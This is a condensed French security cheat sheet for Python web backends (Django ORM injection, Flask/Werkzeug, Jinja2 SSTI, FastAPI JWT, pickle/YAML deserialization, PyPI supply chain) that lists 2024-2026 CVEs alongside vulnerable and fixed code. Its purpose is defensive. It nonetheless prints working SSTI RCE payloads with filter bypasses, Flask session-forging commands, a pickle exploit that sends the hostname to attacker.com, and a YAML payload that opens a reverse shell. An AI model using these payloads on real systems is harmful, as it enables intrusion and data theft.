# Backend Python — Sécurité 2024-2026 (condensé)

## DJANGO — Injection SQL ORM (9 CVEs High/Critical)

| CVE | CVSS | Vecteur | Versions corrigées |
|-----|------|---------|-------------------|
| CVE-2025-64459 | **9.1 Critical** | `_connector`/`_negated` dans `filter()`,`exclude()`,`Q()` | 5.2.8, 5.1.14, 4.2.26 |
| CVE-2024-42005 | High | `values()`/`values_list()` clés JSON | 5.0.8, 4.2.15 |
| CVE-2024-53908 | High | `HasKey` Oracle | 5.1.4, 5.0.10, 4.2.17 |
| CVE-2025-27556 | High | `HasKey` Oracle (variante) | 5.1.8, 5.0.14 |
| CVE-2025-57833 | High 7.1 | `FilteredRelation` aliases colonnes | 5.2.6, 5.1.12, 4.2.24 |
| CVE-2025-59681 | High | `annotate()`/`alias()`/`extra()` MySQL | 5.2.7, 5.1.13, 4.2.25 |
| CVE-2025-13372 | High | `FilteredRelation` PostgreSQL | 5.2.9, 5.1.15, 4.2.27 |
| CVE-2026-1207 | High | Raster lookups PostGIS | 6.0.2, 5.2.11, 4.2.28 |
| CVE-2026-1287 | High | Caractères de contrôle `FilteredRelation` | 6.0.2, 5.2.11, 4.2.28 |
| CVE-2026-1312 | High | `order_by()` + `FilteredRelation` + points | 6.0.2, 5.2.11, 4.2.28 |

### Pattern critique — `**kwargs` ORM (CVE-2025-64459, CVSS 9.1)

```python
# ❌ VULN — attaquant injecte _connector=OR&is_superuser=True
users = User.objects.filter(**request.GET.dict())  # SQLi + auth bypass

# ✅ FIX — allowlist
ALLOWED = {'username', 'email', 'is_active'}
users = User.objects.filter(**{k: v for k, v in request.GET.dict().items() if k in ALLOWED})
```

### Autres vecteurs ORM vulnérables

```python
User.objects.raw(f"... WHERE username = '{user_input}'")  # ❌
User.objects.raw("... WHERE username = %s", [user_input]) # ✅

qs = Model.objects.annotate(val=RawSQL(f"WHERE bar = '{input}'", []))  # ❌
qs = Model.objects.annotate(val=RawSQL("WHERE bar = %s", [input]))     # ✅

Entry.objects.extra(where=["headline = '%s'" % input])          # ❌
Entry.objects.extra(where=['headline=%s'], params=[input])       # ✅
```

### Mass assignment DRF + BOLA

```python
# ❌ VULN mass assignment — expose is_staff
class UserSerializer(serializers.ModelSerializer):
    class Meta: model = User; fields = '__all__'

# ✅ FIX
class Meta:
    fields = ['username', 'email']; read_only_fields = ['is_staff', 'is_superuser']
    extra_kwargs = {'password': {'write_only': True}}

# ❌ BOLA — accès à toutes les commandes
class OrderView(generics.RetrieveAPIView): queryset = Order.objects.all()
# ✅ FIX
def get_queryset(self): return Order.objects.filter(user=self.request.user)

# ❌ DoS via ?page_size=999999999
REST_FRAMEWORK = {'PAGE_SIZE': 100}
# ✅ FIX : max_page_size = 100 dans StandardPagination
```

**CVEs DoS/Enum** : CVE-2024-38875/41989-91/45230/53907, CVE-2025-26699/32873/64460/14550, CVE-2026-1285/25673 (DoS) | CVE-2024-45231, CVE-2025-13473/48432 (énumération utilisateurs timing)

---

## FLASK/WERKZEUG

| CVE | CVSS | Impact | Corrigé |
|-----|------|--------|---------|
| CVE-2024-34069 | 7.5 | CSRF → RCE debugger PIN | Werkzeug 3.0.3 |
| CVE-2024-49767 | 7.5 | DoS multipart : 32 Go RAM <60s | Werkzeug 3.0.6 |
| CVE-2024-49766 | Medium | Path traversal UNC Windows | Werkzeug 3.0.6 |
| CVE-2025-66221 | 5.3 | `safe_join()` devices Windows (CON/AUX/NUL) | Werkzeug 3.1.4 |
| CVE-2026-21860 | 6.3 | Fix incomplet : `CON.txt`/`example/NUL` | Werkzeug 3.1.5 |
| CVE-2026-27199 | — | Paths multi-segments (3e fix) | Werkzeug 3.1.6 |

### RCE debugger (CVE-2024-34069)

```python
app.run(debug=True, host='0.0.0.0')  # ❌ RCE en prod
```

**Exploitation** : PIN SHA1 = f(username + MAC + machine-id) → recalculable via LFI. Cookie `__wzd*` forgeable pour bypasser verrou 3 tentatives. Module Metasploit : `exploit/multi/http/werkzeug_debug_rce`.

### Session forgery Flask (sessions signées, non chiffrées)

```bash
flask-unsign --unsign --cookie '<cookie>' --wordlist rockyou.txt  # brute-force clé
flask-unsign --sign --cookie "{'logged_in': True, 'is_admin': True}" --secret 'CHANGEME'
```

```python
# ✅ FIX
app.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY') or secrets.token_hex(32)
```

### SSTI Jinja2 → RCE (CVE-2025-27516, Critical)

```python
return render_template_string(f'Hello {name}!')   # ❌ VULN
return render_template_string('Hello {{ name }}!', name=name)  # ✅ FIX
```

**Payloads RCE :**
```python
{{lipsum.__globals__['os'].popen('id').read()}}           # plus court
{{cycler.__init__.__globals__.os.popen('id').read()}}
# Bypass filtres __
{{request|attr('\x5f\x5fclass\x5f\x5f')}}
{%set a='_'*2+'class'+'_'*2%}{{''|attr(a)}}
```

**CVE-2025-27516** (Critical) : sandbox breakout via filtre `|attr` → exécution de code arbitraire. Corrigé Jinja2 3.1.6.

**Flask-CORS CVE-2024-6221** (6.5) : `Allow-Private-Network: true` par défaut 4.0.1. Corrigé 4.0.2+. Reflection d'origin + `credentials: true` = vol de données cross-origin.

**Versions min** : Werkzeug ≥ 3.1.6, Flask ≥ 3.1.x, Flask-CORS ≥ 5.0.0, Jinja2 ≥ 3.1.6.

---

## FASTAPI/STARLETTE

| CVE | CVSS | Impact | Corrigé |
|-----|------|--------|---------|
| CVE-2024-47874 | **8.7 Critical** | DoS multipart OOM <60s | Starlette 0.40.0 |
| CVE-2025-54121 | 5.3 | `UploadFile.write()` bloque event loop | Starlette 0.47.2 |
| CVE-2025-62727 | 7.5 | DoS Range header O(n²) → CPU exhaustion | Starlette 0.49.1 |

### JWT — migrer python-jose (abandonné)

**CVE-2024-33663** (7.5) : algorithm confusion HS256 + clé publique ECDSA → forge JWT.
**CVE-2024-33664** : JWT bomb DoS via JWE compression.

```python
# ❌ VULN
from jose import jwt; payload = jwt.decode(token, public_key)  # algo non fixé

# ✅ FIX — PyJWT
payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"],
    audience="my-api", issuer="auth-server",
    options={"require": ["exp", "iat", "sub", "iss", "aud"]})
```

### OAuth CSRF + WebSocket

- **CVE-2025-68481** (fastapi-users < 15.0.2) : state tokens sans entropie → account takeover
- **CVE-2025-14546** (fastapi-sso < 0.19.0) : `verify_and_process` sans vérification session

```python
# ❌ VULN WebSocket — accepte avant de valider
await websocket.accept(); token = await websocket.receive_text()

# ✅ FIX — token en query, close avant accept
async def ws(websocket: WebSocket, token: str = Query(...)):
    try: payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except: await websocket.close(code=1008); return
    await websocket.accept()
```

**Ordre middlewares (stack inversée)** : ajouter CORS en dernier → s'exécute en premier. Auth avant CORS = preflight OPTIONS rejetés.

**Pydantic coercion** : `{"is_admin": "yes"}` → `True` en mode lax. Utiliser `ConfigDict(strict=True)` pour les champs sensibles. CVE-2024-3772 (5.9) : ReDoS email. Corrigé 2.4.0.

**Versions min** : Starlette ≥ 0.49.1, Pydantic ≥ 2.4.0, PyJWT.

---

## PYTHON TRANSVERSAL

### Pickle CVSS 10.0 (CVE-2025-32444)

```python
class Exploit:
    def __reduce__(self): return (os.system, ("curl attacker.com/x?h=$(hostname)",))
payload = pickle.dumps(Exploit())
```

**CVE-2025-32444** (vLLM, CVSS 10.0) : sockets ZeroMQ → pickle → RCE. ~50% modèles HuggingFace populaires contiennent encore du pickle. `picklescan` contournable via `pip.main()` (CVE-2025-1716). Alternatives : JSON, msgpack, safetensors.

### YAML — `yaml.load()` = RCE | subprocess `shell=True` = RCE

```yaml
!!python/object/apply:os.system ["bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"]
```
Toujours `yaml.safe_load()`. CVE-2026-24009 (Docling) : PyYAML vulnérable via dépendance transitive.

```python
subprocess.check_output('nslookup ' + hostname, shell=True)          # ❌ injection shell
subprocess.check_output(['nslookup', hostname], shell=False)         # ✅ liste
os.path.join("var", "lib", "/etc/passwd")  # → "/etc/passwd" !      # ❌ path traversal
safe = (BASE / os.path.basename(filename)).resolve()                 # ✅ + is_relative_to(BASE)
```

### Race conditions asyncio (TOCTOU au point d'await)

```python
# ❌ VULN — deux withdraw(100) réussissent simultanément
async def withdraw(amount):
    current = balance; await asyncio.sleep(0)  # cède le contrôle
    if current >= amount: balance = current - amount  # valeur périmée

# ✅ FIX
async with asyncio.Lock(): ...
```

Python 3.13+ no-GIL (PEP 703) : les races masquées par le GIL vont surfacer.

### Supply chain PyPI 2025-2026

Incidents : **SilentSync RAT** (typosquatting `sisaws`→`sisa`, vol credentials navigateur), **dYdX** (paquet légitime compromis, 100 itérations obfuscation), **Solana** (monkey-patching clés privées), **Ultralytics** (empoisonnement GitHub Actions). 500+ paquets en une campagne (Check Point).

**Défenses** : `pip install --require-hashes`, `pip-audit` CI/CD, Sigstore, Socket.dev.
